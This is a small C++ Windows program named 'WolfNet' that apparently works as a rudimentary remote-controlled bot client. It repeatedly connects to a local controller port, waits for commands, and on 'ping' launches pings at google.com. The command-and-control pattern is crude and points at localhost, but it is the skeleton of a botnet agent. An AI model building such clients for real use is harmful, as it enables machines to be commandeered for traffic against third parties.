#include <winsock2.h>
#include <iostream>
#include <string>;
#pragma comment (lib, "ws2_32.lib")
#pragma warning (disable: 4996)
using namespace std;
SOCKADDR_IN addr;
SOCKET sock;
HANDLE hThread;
DWORD IDThread;

int _col(0);

void connect();


void col()
{
	cout << "col = " << _col;
}

void ping()
{
	system("ping google.com -n 100 -w 10");
}

void wsa()
{
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	if (WSAStartup(DLLVersion, &wsaData) != 0)
	{
		cout << "Error" << endl;
		exit(1);
	}
}

void settingUpaddr()
{
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(9901);
	addr.sin_family = AF_INET;
}

void connect()
{
	char msg[2] = "m";
	sock = socket(AF_INET, SOCK_STREAM, NULL);
t0:
	if (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) != 0)
	{
		cout << "Error of connection" << endl;
		goto t0;
	}
	send(sock, msg, sizeof(msg), NULL);
	cout << "connected" << endl;
}



int main()
{
	cout << 1 << endl;
	SetConsoleTitleW(L"WolfNet");
	cout << 2 << endl;
	wsa();
	cout << 3 << endl;
	settingUpaddr();
	cout << 4 << endl;
	int i = 1;
	string m;
t8:
	system("cls");
	Sleep(1000);
	cout << 5 << endl;
	connect();
t7:
	cout << 6 << endl;
	char msg[40] = "13573151739070";
	cout << 7 << endl;
	cout << msg << endl;
	cout << 8 << endl;
	if (recv(sock, msg, sizeof(msg), NULL) == 0)
	{
		cout << 9 << endl;
		cout << msg << endl;
		goto t8;
	}
	cout << 10 << endl;
	Sleep(1000);
	cout << 11 << endl;
	m = msg;
	cout << 12 << endl;
	cout << m << endl;
	if (m == "col")
	{
		col();
	}
	if (m == "&&")
	{
		cout << 13 << endl;
		send(sock, "@", sizeof("@"), NULL);
		cout << 14 << endl;
		closesocket(sock);
		cout << 15 << endl;
		_col++;
		goto t8;
	}
	if (m == "ping")
	{
		cout << 16 << endl;
		cout << msg << endl;
		cout << 17 << endl;
		ping();
		cout << 18 << endl;
		closesocket(sock);
		goto t8;
	}
	else 
	{
		closesocket(sock);

		goto t8;
	}
	return 0;

}